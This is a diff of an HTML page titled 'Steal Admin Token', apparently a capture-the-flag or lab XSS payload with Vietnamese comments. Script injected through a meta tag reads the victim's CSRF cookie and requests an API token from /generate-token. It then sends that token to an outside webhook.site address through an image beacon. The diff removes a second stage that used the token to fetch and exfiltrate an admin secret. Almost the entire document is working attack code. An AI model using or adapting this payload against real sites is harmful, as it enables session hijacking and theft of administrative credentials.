@@ -2,10 +2,10 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Steal Admin Token & Secret</title>
+  <title>Steal Admin Token</title>
   <meta name="description" content='<script>
     (async function () {
-      const webhook = "https://webhook.site/2b4d8efe-d632-441b-94e9-ffbfc14c48c5";
+      const webhook = "https://webhook.site/dcfcb72d-968b-446f-869b-8072fb60252a";
 
       // Lấy CSRF token từ cookie
       let xsrf = null;
@@ -19,7 +19,7 @@
       if (!xsrf) return;
 
       try {
-        // Bước 1: Lấy API token bằng cách gửi POST tới /generate-token
+        // Lấy API token bằng cách gửi POST tới /generate-token
         const tokenRes = await fetch("/generate-token", {
           method: "POST",
           headers: {
@@ -36,24 +36,8 @@
 
         const token = tokenData.token;
 
-        // Gửi token về webhook (tùy chọn)
+        // Gửi token về webhook
         new Image().src = `${webhook}?stage=got_token&token=${encodeURIComponent(token)}`;
-
-        // Bước 2: Dùng token gọi GET /api/admin/sup3rs3cr3t
-        const secretRes = await fetch("/api/admin/sup3rs3cr3t", {
-          method: "GET",
-          headers: {
-            "Accept": "application/json",
-            "Authorization": "Bearer " + token,
-            "X-Requested-With": "XMLHttpRequest"
-          },
-          credentials: "include"
-        });
-
-        const secretData = await secretRes.json();
-
-        // Gửi secret về webhook
-        new Image().src = `${webhook}?stage=got_secret&data=${encodeURIComponent(JSON.stringify(secretData))}`;
 
       } catch (e) {
         new Image().src = `${webhook}?stage=error&msg=${encodeURIComponent(e.toString())}`;
@@ -62,6 +46,6 @@
   </script>'>
 </head>
 <body>
-  <h1>Admin Page</h1>
+  <h1>Steal Admin Token</h1>
 </body>
 </html>
